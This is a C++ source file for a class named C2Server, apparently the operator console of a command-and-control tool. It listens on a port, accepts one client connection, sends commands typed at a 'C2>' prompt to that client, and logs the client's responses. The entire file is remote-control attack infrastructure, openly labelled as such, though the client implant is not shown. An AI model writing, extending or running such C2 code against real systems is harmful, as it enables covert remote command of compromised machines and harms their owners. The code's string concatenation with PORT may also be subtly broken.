#include "C2Server.h"
#include "Logger.h"
#include <iostream>

C2Server::C2Server(std::unique_ptr<ISocket> s) : socket(std::move(s)) {}
    
        void C2Server::run() {
            try {
                socket->bindSocket(PORT);
                socket->listenToSocket();
                Logger::Instance().Log(LogLevel::INFO, "[*] Listening on port " + PORT);
    
                int clientSocket = socket->acceptConnection();
                Logger::Instance().Log(LogLevel::INFO, "Client connected");
    
                while (true) {
                    std::cout << "C2> ";
                    std::string cmd;
                    if (!std::getline(std::cin, cmd)) break;
    
                    if (cmd.empty()) continue;
    
                    socket->sendToClient(clientSocket, cmd);
    
                    std::string response;
                    try {
                        response = socket->receiveFromClient(clientSocket);
                        Logger::Instance().Log(LogLevel::RESP, response);
                    } catch (const std::exception& e) {
                        Logger::Instance().Log(LogLevel::ERROR, e.what());
                        break;
                    }
                }
    
                close(clientSocket);
            } catch (const std::exception& e) {
                Logger::Instance().Log(LogLevel::ERROR, e.what());
            }
    
            socket->closeConnection();
        }